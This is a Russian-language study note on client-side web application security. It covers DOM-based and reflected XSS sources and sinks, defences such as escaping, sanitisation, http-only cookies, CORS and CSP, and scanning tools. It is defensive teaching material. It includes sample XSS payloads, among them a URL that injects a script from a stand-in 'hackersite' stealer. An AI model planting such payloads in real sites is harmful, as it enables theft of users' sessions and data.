### Безопасность клиентских веб приложений

#### Межсайтовый сприптинг (cross site scripting - XSS) - характеризуется обходом SOP (Same origin policy)
1) XSS
    - 1.1) - DOM-XSS Для фронтенд актуален тип атак DOM-XSS - когда скрипт встраивается в DOM через легитимный код.
        Требует наличия двух условий
        - sources (источники загружаемого вредоносногот кода)
            - document.URL, location, document.referer, window.name, localStorage, cookies
        - sinks - точки исполнения
            - eval, document.write, element.innerHTML, element.src, setTimeout/setInterval, execScript
        - Примеры
        ```js 
            <input value="">
            <iframe SRC="javascript:alert('XSS')"></iframe>
        или
            <input value=""><img src=i oneerror=alert('xss')>
      ```
 
    - 1.2) Reflect XSS - Так же может быть проведен через пользовательские сообщения содержащие ссылки в Вашем приложении
(комментарии, сообщения - `http://forum.by?searchnews<\script%20src="http://hackersite/stealer.js`)
Анализ кода регулярками - перед отправкой на сервер другим клиентам
        - Фильтрация пользовательских форм - представление спецсимолов через escape символы, для ограждения
    от запуска скриптов
        - сантитаризация данных форм
2) Утечки информации - когда js/css файлы содержат информацию об инфраструктуре системы. Следить за тем чтобы
переменные не хранили секреты в открытом виде
3) Фреймворки и библиотеки - актуализация версий, анализ исходного кода библиотек
4) Cookies - включить http-only запрет доступа со стороны js
5) Сетевые запросы со стороны библиотек - мониторинг сетевых запросов
6) CORS - запрет на стороне сервера или ведение списка разрешенных ресурсов
7) WebSockets - нет нативной авторизации, использовать WSS
8) Отсутствие списка разрешенных ресурсов (Content Security Policy - CSP)
9) Flash - не использовать
10) Сохранение конфиденциальных данных в репозитории

#### Автоматизация процесса проверки безопасности
- анализ библиотек  npm audit, Snyk и LGTM
- использование анализаторов приложения при CI/CD
- ESLinit - security plugin
- Фреймворки (OpenVAS, Offensive Web Testing Framework, OWASP Xenotix XSS Exploit Framework)
- Online (CIRT.net, Grandel-Scan, Grabber, Acunetix, cWatch, Approof, SecurityHeaders.io, 
Observatory by Mozilla, One button scan)
- WebpackPlugins - прописывать CSP (html-webpack-plugin, html-webpack-exclude-assets-plugin, 
script-ext-html-webpack-plugin, csp-html-webpack-plugin и crypto, webpack-subresource-integrity-plugin)

Библиография
1) https://habr.com/ru/company/dsec/blog/259389/
2) https://habr.com/ru/company/jugru/blog/349630/
3) https://owasp.org/
4) https://habr.com/ru/post/445932/